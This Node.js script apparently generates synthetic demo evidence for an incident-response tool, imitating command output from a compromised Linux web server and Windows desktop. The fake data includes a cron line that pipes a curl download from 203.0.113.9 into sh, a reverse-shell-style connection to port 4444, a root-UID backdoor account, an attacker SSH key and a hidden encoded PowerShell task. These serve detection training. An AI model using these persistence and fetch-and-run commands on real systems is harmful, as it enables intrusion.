// kar-irhelper · tools/make-demo.mjs — the page's demo evidence. SYNTHETIC: written by hand to look like the output of
// the real collection commands on a compromised host; no real host's data is in this repository.
import { writeFileSync, mkdirSync } from 'node:fs';
const SYN = 'SYNTHETIC — written to resemble real command output from a compromised host; not data from any real machine';
const linux = {
  synthetic: SYN, tool: 'kar-irhelper/1', os: 'linux', host: 'web1', collectedAt: '2026-11-16T12:00:00Z',
  outputs: {
    processes: ['    1 root     Mon Nov 16 08:00:01 2026 /sbin/init', '  640 root     Mon Nov 16 08:00:09 2026 /usr/sbin/nginx -g daemon on;', '  812 www-data Mon Nov 16 10:31:02 2026 /tmp/.x/kworker -c 203.0.113.9:4444', '  999 root     Mon Nov 16 08:00:05 2026 /usr/sbin/sshd -D'].join('\n'),
    sockets: ['Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process', 'tcp   LISTEN 0      128    0.0.0.0:22         0.0.0.0:*         users:(("sshd",pid=999,fd=3))',
      'tcp   LISTEN 0      511    0.0.0.0:443        0.0.0.0:*         users:(("nginx",pid=640,fd=6))', 'tcp   ESTAB  0      0      10.0.0.5:39012     203.0.113.9:4444  users:(("bash",pid=1337,fd=3))'].join('\n'),
    accounts: ['root:x:0:0:root:/root:/bin/bash', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', 'svc:x:0:0::/home/svc:/bin/bash', 'alice:x:1000:1000:Alice:/home/alice:/bin/bash'].join('\n'),
    'ssh-log': [
      ...Array.from({ length: 6 }, (_, i) => '2026-11-16T10:2' + i + ':00+0000 web1 sshd[2' + i + ']: Failed password for alice from 203.0.113.9 port 5000' + i + ' ssh2'),
      '2026-11-16T10:28:00+0000 web1 sshd[30]: Accepted password for alice from 203.0.113.9 port 50100 ssh2',
      '2026-11-16T11:05:00+0000 web1 sshd[41]: Accepted publickey for alice from 192.0.2.10 port 61000 ssh2',
    ].join('\n'),
  },
  files: [
    { id: 'cron', path: '/etc/crontab', mtime: '2026-01-01T00:00:00Z', text: '# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n' },
    { id: 'cron', path: '/var/spool/cron/crontabs/www-data', mtime: '2026-11-16T10:35:00Z', text: '*/5 * * * * curl -s http://203.0.113.9/p | sh\n' },
    { id: 'ssh-keys', path: '/home/alice/.ssh/authorized_keys', mtime: '2026-11-16T10:33:00Z', text: 'ssh-ed25519 AAAAC3Nza…(attacker) x@y' },
    { id: 'ssh-keys', path: '/root/.ssh/authorized_keys', mtime: '2025-06-01T00:00:00Z', text: 'ssh-ed25519 AAAAC3Nza…(admin) admin@laptop' },
  ],
  errors: {},
};
const windows = {
  synthetic: SYN, tool: 'kar-irhelper/1', os: 'windows', host: 'DESK7', collectedAt: '2026-11-16T12:00:00Z',
  outputs: {
    processes: '"ProcessId","Name","ExecutablePath","CommandLine"\r\n"4","System","",""\r\n"700","explorer.exe","C:\\Windows\\explorer.exe","C:\\Windows\\Explorer.EXE"\r\n"6120","svch0st.exe","C:\\Users\\bob\\AppData\\Local\\Temp\\svch0st.exe","svch0st.exe -k netsvcs"\r\n',
    tasks: '"HostName","TaskName","Task To Run"\r\n"DESK7","\\Microsoft\\Windows\\Defrag\\ScheduledDefrag","%windir%\\system32\\defrag.exe -c -h -o"\r\n"DESK7","\\OneDriveSync","powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"\r\n',
    services: '"Name","State","StartMode","PathName"\r\n"Spooler","Running","Auto","C:\\Windows\\System32\\spoolsv.exe"\r\n"UpdSvc","Running","Auto","C:\\Users\\bob\\AppData\\Roaming\\upd\\svc.exe"\r\n',
    logons: '"Time","Id","User","Ip"\r\n' + Array.from({ length: 7 }, (_, i) => '"2026-11-16T09:5' + i + ':00Z","4625","Administrator","203.0.113.9"').join('\r\n') + '\r\n"2026-11-16T09:58:00Z","4624","Administrator","203.0.113.9"\r\n"2026-11-16T08:00:00Z","4624","bob","-"\r\n',
  },
  files: [],
  errors: {},
};
const scope = { authorizedBy: 'A. Patel, Head of IT (demo)', purpose: 'Suspected compromise reported by the SOC (demo)', authorizedAt: '2026-11-16T09:00:00Z', expires: '2026-11-17T09:00:00Z', hosts: ['web1', 'DESK7'] };
mkdirSync(new URL('../data/', import.meta.url), { recursive: true });
writeFileSync(new URL('../data/demo-linux.json', import.meta.url), JSON.stringify(linux, null, 1) + '\n');
writeFileSync(new URL('../data/demo-windows.json', import.meta.url), JSON.stringify(windows, null, 1) + '\n');
writeFileSync(new URL('../data/demo-scope.json', import.meta.url), JSON.stringify(scope, null, 1) + '\n');
console.log('demo written (synthetic)');
